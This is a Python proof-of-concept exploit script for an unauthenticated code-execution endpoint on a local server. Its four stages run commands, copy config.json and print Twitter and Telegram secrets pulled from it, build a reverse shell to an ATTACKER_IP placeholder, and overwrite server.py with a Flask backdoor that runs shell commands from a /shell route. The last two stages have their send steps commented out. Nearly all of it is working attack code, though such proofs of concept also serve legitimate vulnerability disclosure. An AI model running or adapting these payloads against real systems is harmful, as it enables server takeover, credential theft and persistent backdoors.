#!/usr/bin/env python3
"""
PoC: Unauthenticated RCE via /api/execute
Impact: Full server takeover — read files, spawn shells, exfiltrate secrets
Target: http://localhost:7777
"""
import requests, json, os

TARGET = "http://localhost:7777"

def poc_rce_whoami():
    """Stage 1: confirm RCE"""
    payload = {"code": "import subprocess; r=subprocess.run(['id'],capture_output=True); open('/tmp/pwned.txt','w').write(r.stdout.decode())"}
    r = requests.post(f"{TARGET}/api/execute", json=payload)
    print("[RCE stage1]", r.json())

def poc_rce_exfil_config():
    """Stage 2: steal all secrets from config.json"""
    payload = {"code": "import json; d=json.load(open('config.json')); open('/tmp/stolen_config.json','w').write(json.dumps(d))"}
    r = requests.post(f"{TARGET}/api/execute", json=payload)
    # also just call /api/config to get it directly (no RCE needed)
    cfg = requests.get(f"{TARGET}/api/config").json()
    print("[SECRETS EXFIL]")
    print("  Twitter API key:", cfg.get("twitter", {}).get("api_key") or "(empty)")
    print("  Telegram token:", cfg.get("telegram", {}).get("bot_token") or "(empty)")

def poc_rce_reverse_shell():
    """Stage 3: reverse shell (replace IP/port)"""
    payload = {"code": """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('ATTACKER_IP',4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"""}
    print("[REVERSE SHELL] would connect to ATTACKER_IP:4444")
    # Uncomment to execute:
    # requests.post(f"{TARGET}/api/execute", json=payload)

def poc_overwrite_server():
    """Stage 4: overwrite server.py to persist backdoor"""
    backdoor = "from flask import Flask,request; app=Flask(__name__); @app.route('/shell') \ndef shell(): return __import__('subprocess').check_output(request.args.get('c','id'),shell=True).decode()\n"
    payload = {"code": f"open('server.py','w').write({repr(backdoor)})"}
    print("[PERSISTENCE] Would overwrite server.py with backdoor")
    # requests.post(f"{TARGET}/api/execute", json=payload)

if __name__ == "__main__":
    print("=== PoC: Unauthenticated RCE ===")
    poc_rce_whoami()
    poc_rce_exfil_config()
    poc_rce_reverse_shell()
    poc_overwrite_server()
